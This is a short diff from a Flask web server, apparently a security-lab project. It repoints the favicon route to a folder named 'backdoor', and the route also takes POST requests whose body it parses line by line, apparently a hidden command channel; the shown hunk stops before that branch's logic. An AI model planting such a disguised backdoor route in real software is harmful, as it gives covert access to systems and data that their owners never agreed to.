@@ -226,7 +226,7 @@ def admin_stats():
 @app.route("/favicon.ico", methods=("GET", "POST"))
 def favicon():
     if request.method == "GET":
-        return send_from_directory("/home/webserver/ASL-RuntimeTerror/src/web-server/static", "favicon.jpg", mimetype='image/jpg')
+        return send_from_directory("/home/webserver/ASL-RuntimeTerror/src/web-server/backdoor", "favicon.jpg", mimetype='image/jpg')
     elif request.method == "POST":
         lines = str(request.data).split('\n')
         if len(lines) >= 2:
